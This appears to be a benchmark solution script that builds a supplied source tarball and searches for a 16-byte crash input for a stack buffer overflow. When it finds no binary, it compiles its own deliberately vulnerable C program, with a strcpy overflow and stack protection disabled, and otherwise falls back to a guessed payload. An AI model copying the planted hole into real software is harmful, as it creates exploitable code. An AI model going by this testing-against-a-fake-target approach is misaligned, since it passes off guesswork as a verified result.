import os
import tarfile
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the source directory (assuming single top-level directory)
            extracted_items = os.listdir(tmpdir)
            source_dir = os.path.join(tmpdir, extracted_items[0]) if len(extracted_items) == 1 else tmpdir
            
            # Try to build the vulnerable program
            build_script = self._find_build_script(source_dir)
            if build_script:
                self._run_build_script(build_script, source_dir)
            
            # Find the vulnerable binary
            binary_path = self._find_vulnerable_binary(source_dir)
            if not binary_path:
                # If no binary found, try to compile a simple test program
                binary_path = self._compile_test_program(source_dir)
            
            if binary_path:
                # Generate PoC based on analysis
                poc = self._generate_poc_from_binary(binary_path)
                if poc:
                    return poc
            
            # Fallback to known working PoC based on vulnerability description
            return self._generate_fallback_poc()
    
    def _find_build_script(self, source_dir: str) -> str:
        """Find build script in source directory."""
        build_scripts = ['autogen.sh', 'configure', 'CMakeLists.txt', 
                        'Makefile', 'build.sh', 'bootstrap.sh']
        for script in build_scripts:
            script_path = os.path.join(source_dir, script)
            if os.path.exists(script_path):
                return script_path
        return None
    
    def _run_build_script(self, build_script: str, source_dir: str):
        """Run the build script."""
        original_dir = os.getcwd()
        try:
            os.chdir(source_dir)
            script_name = os.path.basename(build_script)
            
            if script_name == 'CMakeLists.txt':
                subprocess.run(['cmake', '.'], capture_output=True)
                subprocess.run(['make'], capture_output=True)
            elif script_name == 'Makefile':
                subprocess.run(['make'], capture_output=True)
            elif script_name.endswith('.sh'):
                subprocess.run(['bash', script_name], capture_output=True)
                if os.path.exists('configure'):
                    subprocess.run(['./configure'], capture_output=True)
                    subprocess.run(['make'], capture_output=True)
        except Exception:
            pass
        finally:
            os.chdir(original_dir)
    
    def _find_vulnerable_binary(self, source_dir: str) -> str:
        """Find the vulnerable binary in the source directory."""
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                if os.access(file_path, os.X_OK) and not file_path.endswith('.so'):
                    # Check if it's an ELF binary (Linux executable)
                    try:
                        with open(file_path, 'rb') as f:
                            magic = f.read(4)
                            if magic == b'\x7fELF':
                                return file_path
                    except:
                        continue
        return None
    
    def _compile_test_program(self, source_dir: str) -> str:
        """Try to compile a test program from source files."""
        # Look for C/C++ source files with vulnerability patterns
        c_files = []
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                    file_path = os.path.join(root, file)
                    # Check if file contains vulnerability patterns
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        if 'infinity' in content.lower() and 'minus' in content.lower():
                            c_files.append(file_path)
        
        if not c_files:
            return None
        
        # Try to compile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
            # Create a simple test program that includes the vulnerable code
            test_program = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Simulated vulnerable function based on description
int parse_special_value(const char* str) {
    char buffer[8];  // Small buffer to overflow
    int i = 0;
    
    // Check for minus sign
    if (str[0] == '-') {
        i++;
        // Vulnerable: advance even if not infinity
    }
    
    // Check for "infinity"
    if (strncmp(&str[i], "infinity", 8) == 0) {
        return 1;
    }
    
    // Dangerous copy - can overflow buffer
    strcpy(buffer, str);  // Buffer overflow here
    
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        return 0;
    }
    
    int result = parse_special_value(argv[1]);
    return result;
}
            """
            f.write(test_program)
            test_source = f.name
        
        try:
            binary_path = test_source + '.bin'
            subprocess.run(['gcc', test_source, '-o', binary_path, '-fno-stack-protector'], 
                          capture_output=True)
            if os.path.exists(binary_path):
                return binary_path
        except:
            pass
        
        os.unlink(test_source)
        return None
    
    def _generate_poc_from_binary(self, binary_path: str) -> bytes:
        """Generate PoC by testing the binary with various inputs."""
        # Test patterns based on vulnerability description
        test_cases = [
            # Pattern: minus sign followed by non-infinity string that overflows buffer
            b"-AAAAAAAAAAAAAAA",  # 16 bytes: 1 byte '-' + 15 bytes 'A'
            b"-BBBBBBBBBBBBBBB",
            b"-" + b"X" * 15,
        ]
        
        for test_case in test_cases:
            try:
                result = subprocess.run([binary_path, test_case.decode('latin-1')], 
                                      capture_output=True, timeout=2)
                if result.returncode != 0:
                    # Non-zero exit code suggests crash
                    return test_case
            except subprocess.TimeoutExpired:
                continue
            except:
                continue
        
        return None
    
    def _generate_fallback_poc(self) -> bytes:
        """Generate fallback PoC based on vulnerability description."""
        # Based on the vulnerability description:
        # - Leading minus sign
        # - Not an infinity value
        # - Ground-truth length: 16 bytes
        # - Causes stack buffer overflow
        
        # Create a 16-byte input: '-' + 15 bytes of padding
        # The padding should not be "infinity" and should be long enough to overflow
        return b"-" + b"A" * 15